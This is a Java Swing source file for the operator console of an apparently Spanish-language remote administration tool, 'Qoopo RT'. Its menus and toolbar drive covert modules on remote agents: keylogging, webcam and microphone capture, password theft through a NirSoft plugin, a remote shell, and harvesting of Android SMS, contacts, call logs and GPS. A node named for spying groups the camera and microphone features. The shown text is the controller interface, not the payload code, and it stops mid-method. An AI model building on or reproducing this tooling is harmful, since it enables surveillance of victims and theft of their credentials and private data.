package qooport.avanzado;

import java.awt.BorderLayout;
import java.awt.Color;
import java.awt.Desktop;
import java.awt.Dimension;
import java.awt.GridLayout;
import java.awt.HeadlessException;
import java.awt.Image;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.awt.event.MouseEvent;
import java.awt.event.WindowEvent;
import java.awt.event.WindowListener;
import java.io.File;
import javax.swing.ImageIcon;
import javax.swing.JButton;
import javax.swing.JCheckBox;
import javax.swing.JFileChooser;
import javax.swing.JFrame;
import javax.swing.JLabel;
import javax.swing.JMenu;
import javax.swing.JMenuItem;
import javax.swing.JOptionPane;
import javax.swing.JPanel;
import javax.swing.JPopupMenu;
import javax.swing.JScrollPane;
import javax.swing.JSpinner;
import javax.swing.JSplitPane;
import javax.swing.JTabbedPane;
import javax.swing.JTable;
import javax.swing.JTextArea;
import javax.swing.JTextField;
import javax.swing.JTextPane;
import javax.swing.JToolBar;
import javax.swing.JTree;
import javax.swing.SpinnerNumberModel;
import javax.swing.event.ChangeEvent;
import javax.swing.event.ChangeListener;
import javax.swing.event.TreeSelectionEvent;
import javax.swing.event.TreeSelectionListener;
import javax.swing.table.DefaultTableCellRenderer;
import javax.swing.table.DefaultTableModel;
import javax.swing.tree.DefaultMutableTreeNode;
import javax.swing.tree.DefaultTreeModel;
import javax.swing.tree.TreeSelectionModel;
import qooport.Global;
import qooport.Inicio;
import qooport.asociado.Asociado;
import qooport.gui.Infor;
import qooport.gui.NoIp;
import qooport.gui.personalizado.ArbolCellRendered;
import qooport.gui.personalizado.BarraEstado;
import qooport.gui.personalizado.PanelEquipos;
import qooport.modulos.ArchivosOffline;
import qooport.modulos.Informacion;
import qooport.modulos.Mapa;
import qooport.modulos.Mensajes;
import qooport.modulos.Portapapeles;
import qooport.modulos.android.Contactos;
import qooport.modulos.android.Llamadas;
import qooport.modulos.android.SMSListar;
import qooport.modulos.archivos.AdminArchivos;
import qooport.modulos.camara.Camara;
import qooport.modulos.escritorioremoto.EscritorioRemoto;
import qooport.modulos.keylogger.KeyLogger;
import qooport.modulos.pc.Chat;
import qooport.modulos.pc.Conexiones;
import qooport.modulos.pc.MonitorSistemaAsociado;
import qooport.modulos.pc.Passwords;
import qooport.modulos.pc.Procesos;
import qooport.modulos.pc.RedLan;
import qooport.modulos.pc.TextoSpeak;
import qooport.modulos.pc.terminal.Terminal;
import qooport.modulos.reproductorCapturas.ReproductorCapturas;
import qooport.modulos.voip.VoIp;
import qooport.utilidades.GuiUtil;
import qooport.utilidades.SerializarUtil;
import qooport.utilidades.Util;
import qooport.utilidades.cifrado.Encriptacion;

/**
 *
 * @author alberto
 */
public class ModoAvanzado extends JFrame {

    public static JTextPane paneTransferencia;

    public static JTextPane getPaneTransferencia() {
        return paneTransferencia;
    }

    public static void setPaneTransferencia(JTextPane paneTransferencia) {
        ModoAvanzado.paneTransferencia = paneTransferencia;
    }

    private JTree arbolOpciones;
    private JToolBar barra;
    private JButton btnCrearAgente = null;
    private JButton btnAcerca = null;
    private JButton btnCambiar = null;
    private JButton btnMapa = null;
    private JButton btnAgregarAgente = null;
    private JButton btnEscritorioRemoto = null;
    private JButton btnCamara = null;
    private JButton btnAdminArchivos = null;
    private JButton btnConsola = null;
    private JButton btnMicrofono = null;
    private JButton btnMensaje = null;
    private JButton btnIniciar = null;
    private JButton btnArchivosOfflineVisor = null;
    private JPanel contenedorPrincipal;
    private JPopupMenu ppmnuServer;
    private JMenu menuAgente;
    private JMenu menuApagar;
    private JMenu menuControlAgente;
    private JMenuItem itmAbrirUrl;
    private JMenuItem itmBuscarIp;
    private JMenuItem itmEscritorioRemoto;
    private JMenuItem itmCamara;
    private JMenuItem itmAdminArchivos;
    private JMenuItem itmProcesos;
    private JMenuItem itmConexiones;
    private JMenuItem itmInfo;
    private JMenuItem itmCargaSistema;
    private JMenuItem itmPortaPapeles;
    private JMenuItem itmKeyLogger;
    private JMenuItem itmConsola;
    private JMenuItem itmChat;
    private JMenuItem itmReiniciarEquipo;
    private JMenuItem itmApagarEquipo;
    private JMenuItem itmReiniciarAgente;
    private JMenuItem itmApagarServidor;
    private JMenuItem itmEnviarPlgInWC;
    private JMenuItem itmEnviarPlgInJNA;
    private JMenuItem itmEnviarPlgInKL;
    private JMenuItem itmEnviarPlgNirsoft;
    private JMenuItem itmCapturarMicrofono;
    private JMenuItem itmActualizarServidor;
    private JMenuItem itmActualizarServidorOtro;
    private JMenuItem itmDesinstalarServidor;
    private JMenuItem itmPing;
    private JMenuItem itmPasswords;
    private JMenuItem itmMsgBox;
    private JMenu menuPC;
    private JMenu menuAndroid;
    private JMenuItem itmAndroidGPS;
    private JMenuItem itmAndroidContactos;
    private JMenuItem itmAndroidSMS;
    private JMenuItem itmAndroidLlamadas;
    private JMenuItem itmArchivosOffline;
    private JMenuItem itmArchivosOfflineVisor;
    private JMenuItem itmListarRedLan;
    private NoIp panelNoIp;
    private JTabbedPane tabs;
    private JPanel panelUsuarios;
    private JPanel panelTransferencias;
    private Config pnlConfiguracion;
    private JButton btnDescargasAbrir;
    private JButton btnEliminarCompletos;
    private JCheckBox chkCerrarAlTerminar;
    private JScrollPane jscrollTransferencias;
    private JMenu menuControl;
    private JMenuItem itmCrearServidor;
    private JPanel panelInfo;
    private JLabel vistaPrevia;
    private JCheckBox chkVistaPrevia;
    private JCheckBox chkVistaPreviaWC;
    private JCheckBox chkVistaPreviaWCAndroid;
    private JCheckBox chkGuardarMiniaturas;
    private JTextArea txtLog;
    private JScrollPane scrollLog;
    private JTable tblPerfiles;
    private JScrollPane scrollTablaPerfiles;
    private JPanel panelPerfil;
    private JSpinner segundos;
    // el servidor seleccionado
    private String serverSeleccionado = "";
    private JPanel panelInferior;
    private BarraEstado barraEstado;
    private PanelEquipos equipos;
    private QoopoRT cliente;

    public ModoAvanzado() throws HeadlessException {
    }

    public ModoAvanzado(String title, QoopoRT cliente) throws HeadlessException {
        super(title);
        this.cliente = cliente;
        iniciarComponentes();
    }

    private void iniciarComponentes() {
        this.tabs = new JTabbedPane();
        barra = new JToolBar();
        barra.setFloatable(false);
        btnIniciar = GuiUtil.crearJButton("Iniciar", "", Util.cargarIcono16("/resources/start.png"), false);
        btnIniciar.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent evt) {
                cliente.ConectaODesconectaPuerto();
            }
        });
        barra.add(btnIniciar);
        btnCrearAgente = GuiUtil.crearJButton("Crear agente", "Crear agente", Util.cargarIcono16("/resources/computer.png"), false);
        btnCrearAgente.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent evt) {
                btnCrearServidorActionPerformed(evt);
            }
        });
        barra.add(btnCrearAgente);
        btnAcerca = GuiUtil.crearJButton("Acerca de", "Acerca de", Util.cargarIcono16("/resources/info.png"), false);
        btnAcerca.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent evt) {
                Infor.ver();
            }
        });
        barra.add(btnAcerca);

        JButton btnMonitor = GuiUtil.crearJButton("Carga sistema", "Monitor del sistema", Util.cargarIcono16("/resources/monitor_load.png"), false);
        btnMonitor.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent evt) {
                MonitorSistema.ver();
            }
        });
        barra.add(btnMonitor);

        btnCambiar = GuiUtil.crearJButton("Cambiar", "Cambiar modo", Util.cargarIcono16("/resources/switch.png"), false);
        btnCambiar.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent evt) {
                Inicio.main(null);
                QoopoRT.instancia.detenerServicio();
                QoopoRT.instancia = null;
                ModoAvanzado.this.dispose();
            }
        });
        barra.add(btnCambiar);

        btnMapa = GuiUtil.crearJButton("Mapa", "Mapa con las conexiones actuales", Util.cargarIcono16("/resources/map_location.png"), false);
        btnMapa.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent evt) {
                Mapa ven = new Mapa();
                ven.setVisible(true);
                GuiUtil.centrarVentana(ven);
            }
        });
        barra.add(btnMapa);

        barra.addSeparator();
        btnAgregarAgente = GuiUtil.crearJButton("", "Agregar Agente (Conexión Directa)", Util.cargarIcono16("/resources/connect.png"), false);
        this.btnAgregarAgente.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent evt) {
                try {
                    ConexionDirecta con = new ConexionDirecta(cliente);
                    con.setVisible(true);
                } catch (Exception ex) {
                    cliente.ponerEstado("Error al conectar:" + ex.getMessage());
                }
            }
        });
        barra.add(btnAgregarAgente);
        btnEscritorioRemoto = GuiUtil.crearJButton("", "Escritorio Remoto", Util.cargarIcono16("/resources/remoto.png"), false);
        this.btnEscritorioRemoto.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent evt) {
                escritorioRemotoAP(evt);
            }
        });
        barra.add(btnEscritorioRemoto);
        btnCamara = GuiUtil.crearJButton("", "Cámara Remota", Util.cargarIcono16("/resources/camera.png"), false);
        this.btnCamara.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent evt) {
                camaraAP(evt);
            }
        });
        barra.add(btnCamara);
        btnAdminArchivos = GuiUtil.crearJButton("", "Administrador de archivos", Util.cargarIcono16("/resources/folder.png"), false);
        this.btnAdminArchivos.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent evt) {
                administrarArchivosActionPerformed(evt);
            }
        });
        barra.add(btnAdminArchivos);
        btnMicrofono = GuiUtil.crearJButton("", "VoIP/Captura de Micrófono", Util.cargarIcono16("/resources/voip.png"), false);
        this.btnMicrofono.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent evt) {
                capturarMicrofonoPerformed(evt);
            }
        });
        barra.add(btnMicrofono);
        btnConsola = GuiUtil.crearJButton("", "Consola remota / Shell", Util.cargarIcono16("/resources/cmd.png"), false);
        this.btnConsola.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent evt) {
                consolaAP(evt);
            }
        });
        barra.add(btnConsola);
        btnMensaje = GuiUtil.crearJButton("", "Enviar Mensaje", Util.cargarIcono16("/resources/msgBox.png"), false);
        this.btnMensaje.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent evt) {
                enviarMensajeAP(evt);
            }
        });
        barra.add(btnMensaje);
        btnArchivosOfflineVisor = GuiUtil.crearJButton("", "Visor de archivos offline", Util.cargarIcono16("/resources/player.png"), false);
        this.btnArchivosOfflineVisor.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent evt) {
                archivosOfflineVisor(evt);
            }
        });
        barra.add(btnArchivosOfflineVisor);
        JButton btnVisorKeyLogger = GuiUtil.crearJButton("", "Abrir carpeta del servidor", Util.cargarIcono16("/resources/key_ctrl.png"), false);
        btnVisorKeyLogger.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent evt) {
                abrirKeyloggerVisor(evt);
            }
        });
        barra.add(btnVisorKeyLogger);

        JButton btnCarpeta = GuiUtil.crearJButton("", "Abrir carpeta del servidor", Util.cargarIcono16("/resources/folder_search.png"), false);
        btnCarpeta.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent evt) {
                abrirCarpeta(evt);
            }
        });
        barra.add(btnCarpeta);
        panelNoIp = new NoIp();

//        panelNoIp.add(this.lblEstadoNoIp);
//        MENU DE LA TABLA (adminsitrar servidor)
        this.ppmnuServer = new JPopupMenu();
        this.menuControlAgente = new JMenu();
        this.menuControlAgente.setIcon(Util.cargarIcono16("/resources/controlpanel.png"));
        this.menuControlAgente.setText("Control");

        //iteminfo
        this.itmInfo = GuiUtil.crearMenuItem("Información", "", Util.cargarIcono16("/resources/info.png"), true);
        this.itmInfo.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent evt) {
                infoAP(evt);
            }
        });
        menuControlAgente.add(itmInfo);

        this.itmCargaSistema = GuiUtil.crearMenuItem("CargaSistema", "", Util.cargarIcono16("/resources/monitor_load.png"), true);
        this.itmCargaSistema.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent evt) {
                cargaSistemaAP(evt);
            }
        });
        menuControlAgente.add(itmCargaSistema);

        menuControlAgente.addSeparator();

        menuApagar = new JMenu();
        this.menuApagar.setIcon(Util.cargarIcono16("/resources/shutdown.png"));
        this.menuApagar.setText("Apagado Remoto");
        //item Reiniciar Asociado
        this.itmReiniciarEquipo = GuiUtil.crearMenuItem("Reiniciar Equipo", "Reiniciar Equipo", Util.cargarIcono16("/resources/restart.png"), true);
        this.itmReiniciarEquipo.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent evt) {
                reiniciarEquipo(evt);
            }
        });
        this.menuApagar.add(this.itmReiniciarEquipo);
        //item Apagar Asociado
        this.itmApagarEquipo = new JMenuItem();
        this.itmApagarEquipo.setIcon(Util.cargarIcono16("/resources/shutdown.png"));
        this.itmApagarEquipo.setText("Apagar Equipo");
        this.itmApagarEquipo.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent evt) {
                apagarEquipo(evt);
            }
        });
        this.menuApagar.add(this.itmApagarEquipo);

        menuControlAgente.add(menuApagar);
        menuControlAgente.addSeparator();

        //item cap pantalla
        this.itmEscritorioRemoto = GuiUtil.crearMenuItem("Escritorio Remoto", "Escritorio Remoto", Util.cargarIcono16("/resources/remoto.png"), true);
        this.itmEscritorioRemoto.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent evt) {
                escritorioRemotoAP(evt);
            }
        });
        this.menuControlAgente.add(this.itmEscritorioRemoto);
        //item cap webcam
        this.itmCamara = GuiUtil.crearMenuItem("Cámara Remota", "Cámara Remota", Util.cargarIcono16("/resources/camera.png"), true);
        this.itmCamara.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent evt) {
                camaraAP(evt);
            }
        });
        this.menuControlAgente.add(this.itmCamara);
        //item cap microfono
        this.itmCapturarMicrofono = GuiUtil.crearMenuItem("VoIP", "VoIP", Util.cargarIcono16("/resources/voip.png"), true);
        this.itmCapturarMicrofono.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent evt) {
                capturarMicrofonoPerformed(evt);
            }
        });
        this.menuControlAgente.add(this.itmCapturarMicrofono);
        //item Admin Archivos
        this.itmAdminArchivos = GuiUtil.crearMenuItem("Administrador de Archivos", "Administrador de Archivos", Util.cargarIcono16("/resources/folder.png"), true);
        this.itmAdminArchivos.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent evt) {
                administrarArchivosActionPerformed(evt);
            }
        });
        this.menuControlAgente.add(this.itmAdminArchivos);

        this.ppmnuServer.add(this.menuControlAgente);

        //ppmnuServer.add(this.menuApagar);
        menuAgente = new JMenu();
        this.menuAgente.setIcon(Util.cargarIcono16("/resources/computer.png"));
        this.menuAgente.setText("Cliente");
        //item Reiniciar Asociado
        this.itmReiniciarAgente = new JMenuItem();
        this.itmReiniciarAgente.setIcon(Util.cargarIcono16("/resources/restart.png"));
        this.itmReiniciarAgente.setText("Reiniciar Cliente");
        this.itmReiniciarAgente.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent evt) {
                reiniciarServidor(evt);
            }
        });
        this.menuAgente.add(this.itmReiniciarAgente);
        //item Apagar Asociado
        this.itmApagarServidor = new JMenuItem();
        this.itmApagarServidor.setIcon(Util.cargarIcono16("/resources/shutdown.png"));
        this.itmApagarServidor.setText("Detener Cliente");
        this.itmApagarServidor.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent evt) {
                apagarServidor(evt);
            }
        });
        this.menuAgente.add(this.itmApagarServidor);
        //item ActualizarServidor
        this.itmActualizarServidor = new JMenuItem();
        this.itmActualizarServidor.setIcon(Util.cargarIcono16("/resources/update_app.png"));
        this.itmActualizarServidor.setText("Actualizar agente configurado");
        this.itmActualizarServidor.setToolTipText("Sube el agente configurado en actualización automática");
        this.itmActualizarServidor.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent evt) {
                actualizarServidorAutomatico(evt);
            }
        });
        this.menuAgente.add(this.itmActualizarServidor);

        //item itmActualizarServidorOtro
        this.itmActualizarServidorOtro = new JMenuItem();
        this.itmActualizarServidorOtro.setIcon(Util.cargarIcono16("/resources/update_app.png"));
        this.itmActualizarServidorOtro.setText("Actualizar agente (Seleccionar).");
        this.itmActualizarServidorOtro.setToolTipText("Selecciona manualmente el agente a subir.");
        this.itmActualizarServidorOtro.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent evt) {
                actualizarServidor(evt);
            }
        });
        this.menuAgente.add(this.itmActualizarServidorOtro);

        //item DesinstalarServidor
        this.itmDesinstalarServidor = new JMenuItem();
        this.itmDesinstalarServidor.setIcon(Util.cargarIcono16("/resources/trash.png"));
        this.itmDesinstalarServidor.setText("Desinstalar agente");
        this.itmDesinstalarServidor.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent evt) {
                desinstalarAgente(evt);
            }
        });
        this.menuAgente.add(this.itmDesinstalarServidor);
        ppmnuServer.add(this.menuAgente);

        JMenu menuPlugins = new JMenu();
        menuPlugins.setIcon(Util.cargarIcono16("/resources/plugin.png"));
        menuPlugins.setText("Plugins");

        //enviar todos los plugins
        JMenuItem itmEnviarPlugins = new JMenuItem();
        itmEnviarPlugins.setIcon(Util.cargarIcono16("/resources/plugin.png"));
        itmEnviarPlugins.setText("Enviar Todos los Plugins");
        itmEnviarPlugins.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent evt) {
                enviarPluginsWebCam(evt);
                enviarPluginsJNA(evt);
                enviarPluginsKL(evt);
                enviarPluginsNirSoft(evt);
            }
        });
        menuPlugins.add(itmEnviarPlugins);

        JMenuItem itmVerPlugins = new JMenuItem();
        itmVerPlugins.setIcon(Util.cargarIcono16("/resources/plugin.png"));
        itmVerPlugins.setText("Ver Plugins");
        itmVerPlugins.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent evt) {
                verPluginsAP(evt);
            }
        });
        menuPlugins.add(itmVerPlugins);

        menuPlugins.addSeparator();

        //item EnviarPlginsWebCam
        this.itmEnviarPlgInWC = new JMenuItem();
        this.itmEnviarPlgInWC.setIcon(Util.cargarIcono16("/resources/plugin.png"));
        this.itmEnviarPlgInWC.setText("Enviar Plugin WebCam");
        this.itmEnviarPlgInWC.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent evt) {
                enviarPluginsWebCam(evt);
            }
        });
        menuPlugins.add(this.itmEnviarPlgInWC);

        //item EnviarPlginsWebCam
        this.itmEnviarPlgInJNA = new JMenuItem();
        this.itmEnviarPlgInJNA.setIcon(Util.cargarIcono16("/resources/plugin.png"));
        this.itmEnviarPlgInJNA.setText("Enviar Plugin JNA");
        this.itmEnviarPlgInJNA.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent evt) {
                enviarPluginsJNA(evt);
            }
        });
        menuPlugins.add(this.itmEnviarPlgInJNA);
        //item enviar plugins KL
        this.itmEnviarPlgInKL = new JMenuItem();
        this.itmEnviarPlgInKL.setIcon(Util.cargarIcono16("/resources/plugin.png"));
        this.itmEnviarPlgInKL.setText("Enviar Plugin KeyLogger");
        this.itmEnviarPlgInKL.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent evt) {
                enviarPluginsKL(evt);
            }
        });
        menuPlugins.add(this.itmEnviarPlgInKL);
        //item enviar plgins nirsoft
        this.itmEnviarPlgNirsoft = new JMenuItem();
        this.itmEnviarPlgNirsoft.setIcon(Util.cargarIcono16("/resources/plugin.png"));
        this.itmEnviarPlgNirsoft.setText("Enviar Plugin Passwords (Nirsoft)");
        this.itmEnviarPlgNirsoft.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent evt) {
                enviarPluginsNirSoft(evt);
            }
        });
        menuPlugins.add(this.itmEnviarPlgNirsoft);
        this.ppmnuServer.add(menuPlugins);
        //item Ping
        this.itmPing = new JMenuItem();
        this.itmPing.setIcon(Util.cargarIcono16("/resources/ping0.png"));
        this.itmPing.setText("Ping");
        this.itmPing.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent evt) {
                hacerPing(evt);
            }
        });
        this.ppmnuServer.add(this.itmPing);
        //item Archivos offline
        this.itmArchivosOffline = new JMenuItem();
        this.itmArchivosOffline.setIcon(Util.cargarIcono16("/resources/offline.png"));
        this.itmArchivosOffline.setText("Archivos Offline");
        this.itmArchivosOffline.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent evt) {
                archivosOffline(evt);
            }
        });
        ppmnuServer.addSeparator();
        this.ppmnuServer.add(this.itmArchivosOffline);
        //item Archivos offline Visor
        this.itmArchivosOfflineVisor = new JMenuItem();
        this.itmArchivosOfflineVisor.setIcon(Util.cargarIcono16("/resources/player.png"));
        this.itmArchivosOfflineVisor.setText("Visor Capturas Offline");
        this.itmArchivosOfflineVisor.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent evt) {
                archivosOfflineVisor(evt);
            }
        });
        this.ppmnuServer.add(this.itmArchivosOfflineVisor);
        //item buscar ip
        this.itmBuscarIp = new JMenuItem();
        this.itmBuscarIp.setIcon(Util.cargarIcono16("/resources/location.png"));
        this.itmBuscarIp.setText("Buscar IP");
        this.itmBuscarIp.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent evt) {
                buscarIp(evt);
            }
        });

        ppmnuServer.addSeparator();
        this.ppmnuServer.add(this.itmBuscarIp);

        this.menuPC = new JMenu();
        this.menuPC.setIcon(Util.cargarIcono16("/resources/screen.png"));
        this.menuPC.setText("PC");

        //item gestor procesos
        this.itmProcesos = new JMenuItem();
        this.itmProcesos.setIcon(Util.cargarIcono16("/resources/procesos.png"));
        this.itmProcesos.setText("Procesos");
        this.itmProcesos.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent evt) {
                procesosAP(evt);
            }
        });
        this.menuPC.add(this.itmProcesos);
        //item gestor procesos
        this.itmConexiones = new JMenuItem();
        this.itmConexiones.setIcon(Util.cargarIcono16("/resources/conexiones.png"));
        this.itmConexiones.setText("Conexiones");
        this.itmConexiones.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent evt) {
                conexionesAP(evt);
            }
        });
        this.menuPC.add(this.itmConexiones);

        //item red lan
        this.itmListarRedLan = new JMenuItem();
        this.itmListarRedLan.setIcon(Util.cargarIcono16("/resources/redlan.png"));
        this.itmListarRedLan.setText("Listar equipos Red Lan");
        this.itmListarRedLan.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent evt) {
                redlanAP(evt);
            }
        });
        this.menuPC.add(this.itmListarRedLan);

        //porta papeles
        this.itmPortaPapeles = GuiUtil.crearMenuItem("Portapapeles", "", Util.cargarIcono16("/resources/clipboard.png"), true);
        this.itmPortaPapeles.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent evt) {
                portapapelesAP(evt);
            }
        });
        menuPC.add(itmPortaPapeles);
        //keylogger
        this.itmKeyLogger = GuiUtil.crearMenuItem("KeyLogger", "", Util.cargarIcono16("/resources/key_ctrl.png"), true);
        this.itmKeyLogger.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent evt) {
                abrirKeylogger(evt);
            }
        });
        menuPC.add(itmKeyLogger);
        //interprete de comandos (consola)
        this.itmConsola = GuiUtil.crearMenuItem("Shell remota", "", Util.cargarIcono16("/resources/cmd.png"), true);
        this.itmConsola.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent evt) {
                consolaAP(evt);
            }
        });
        menuPC.add(itmConsola);
        //chat
        this.itmChat = GuiUtil.crearMenuItem("Chat", "", Util.cargarIcono16("/resources/chat.png"), true);
        this.itmChat.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent evt) {
                chatAP(evt);
            }
        });
        menuPC.add(itmChat);

        //item abrir url
        this.itmAbrirUrl = new JMenuItem();
        this.itmAbrirUrl.setIcon(Util.cargarIcono16("/resources/browser.png"));
        this.itmAbrirUrl.setText("Abrir Web");
        this.itmAbrirUrl.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent evt) {
                abrirURL(evt);
            }
        });
        this.menuPC.add(this.itmAbrirUrl);

        //item cuadro de mensaje
        this.itmMsgBox = new JMenuItem();
        this.itmMsgBox.setIcon(Util.cargarIcono16("/resources/msgBox.png"));
        this.itmMsgBox.setText("Cuadro de Mensaje");
        this.itmMsgBox.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent evt) {
                enviarMensajeAP(evt);
            }
        });
        this.menuPC.add(this.itmMsgBox);
        //item speak text
        JMenuItem itmSpeakText = new JMenuItem();
        itmSpeakText.setIcon(Util.cargarIcono16("/resources/sound.png"));
        itmSpeakText.setText("Speak Text");
        itmSpeakText.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent evt) {
                textSpeakAP(evt);
            }
        });
        this.menuPC.add(itmSpeakText);

        //item passwords
        this.itmPasswords = new JMenuItem();
        this.itmPasswords.setIcon(Util.cargarIcono16("/resources/pass.png"));
        this.itmPasswords.setText("Obtener Contraseñas");
        this.itmPasswords.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent evt) {
                abrirPasswords(evt);
            }
        });
        this.menuPC.add(this.itmPasswords);

        menuControlAgente.addSeparator();
        this.menuControlAgente.add(this.menuPC);
        this.menuAndroid = new JMenu();
        this.menuAndroid.setIcon(Util.cargarIcono16("/resources/android16.png"));
        this.menuAndroid.setText("Android");
        //item Abrir gps
        this.itmAndroidGPS = new JMenuItem();
        this.itmAndroidGPS.setIcon(Util.cargarIcono16("/resources/map.png"));
        this.itmAndroidGPS.setText("Abrir GPS");
        this.itmAndroidGPS.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent evt) {
                abrirGPSActionPerformed(evt);
            }
        });
        this.menuAndroid.add(this.itmAndroidGPS);
        //itemContactos
        this.itmAndroidContactos = new JMenuItem();
        this.itmAndroidContactos.setIcon(Util.cargarIcono16("/resources/contactos.png"));
        this.itmAndroidContactos.setText("Contactos");
        this.itmAndroidContactos.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent evt) {
                abrirContactosActionPerformed(evt);
            }
        });
        this.menuAndroid.add(this.itmAndroidContactos);
        //item SMS
        this.itmAndroidSMS = new JMenuItem();
        this.itmAndroidSMS.setIcon(Util.cargarIcono16("/resources/sms.png"));
        this.itmAndroidSMS.setText("SMS");
        this.itmAndroidSMS.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent evt) {
                abrirSMSActionPerformed(evt);
            }
        });
        this.menuAndroid.add(this.itmAndroidSMS);
        //item Llamadas
        this.itmAndroidLlamadas = new JMenuItem();
        this.itmAndroidLlamadas.setIcon(Util.cargarIcono16("/resources/llamada16.png"));
        this.itmAndroidLlamadas.setText("Llamadas");
        this.itmAndroidLlamadas.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent evt) {
                abrirLlamadasActionPerformed(evt);
            }
        });
        this.menuAndroid.add(this.itmAndroidLlamadas);
        this.menuControlAgente.add(this.menuAndroid);

//        this.tabla.updateUI();
        //   PANEL DE INFO
        DefaultMutableTreeNode nodoRoot = new DefaultMutableTreeNode("Opciones");
        DefaultTreeModel modelo = new DefaultTreeModel(nodoRoot);
        this.arbolOpciones = new JTree(modelo);
        arbolOpciones.setCellRenderer(new ArbolCellRendered());
        DefaultMutableTreeNode nodoInformacion = new DefaultMutableTreeNode("Información");
        DefaultMutableTreeNode nodoEspiar = new DefaultMutableTreeNode("Herramientas");
        DefaultMutableTreeNode nodoEscritorio = new DefaultMutableTreeNode("Escritorio Remoto");
        DefaultMutableTreeNode nodoCamara = new DefaultMutableTreeNode("Cámara");
        DefaultMutableTreeNode nodoMic = new DefaultMutableTreeNode("VoIP");
        DefaultMutableTreeNode nodoAdministrar = new DefaultMutableTreeNode("Administrar");
        DefaultMutableTreeNode nodoArchivos = new DefaultMutableTreeNode("Archivos");
        DefaultMutableTreeNode nodoConsola = new DefaultMutableTreeNode("Consola");
        DefaultMutableTreeNode nodoClipboard = new DefaultMutableTreeNode("Portapapeles");
        DefaultMutableTreeNode nodoProcesos = new DefaultMutableTreeNode("Procesos");
        DefaultMutableTreeNode nodoConexiones = new DefaultMutableTreeNode("Conexiones");
        DefaultMutableTreeNode nodoPlugins = new DefaultMutableTreeNode("Plugins");
        DefaultMutableTreeNode nodoPlugWC = new DefaultMutableTreeNode("WebCam");
        DefaultMutableTreeNode nodoPlugNirsoft = new DefaultMutableTreeNode("NirSoft");
        DefaultMutableTreeNode nodoAndroid = new DefaultMutableTreeNode("Android");
        DefaultMutableTreeNode nodoGPS = new DefaultMutableTreeNode("GPS");
        DefaultMutableTreeNode nodoSMS = new DefaultMutableTreeNode("SMS");
        DefaultMutableTreeNode nodoLlamadas = new DefaultMutableTreeNode("Llamadas");
        DefaultMutableTreeNode nodoContactos = new DefaultMutableTreeNode("Contactos");
        DefaultMutableTreeNode nodoComunicacion = new DefaultMutableTreeNode("Comunicación");
        DefaultMutableTreeNode nodoChat = new DefaultMutableTreeNode("Chat");
        modelo.insertNodeInto(nodoInformacion, nodoRoot, 0);
        modelo.insertNodeInto(nodoEspiar, nodoRoot, 1);
        modelo.insertNodeInto(nodoCamara, nodoEspiar, 0);
        modelo.insertNodeInto(nodoMic, nodoEspiar, 1);
        modelo.insertNodeInto(nodoAdministrar, nodoRoot, 2);
        modelo.insertNodeInto(nodoEscritorio, nodoAdministrar, 0);
        modelo.insertNodeInto(nodoArchivos, nodoAdministrar, 1);
        modelo.insertNodeInto(nodoConsola, nodoAdministrar, 2);
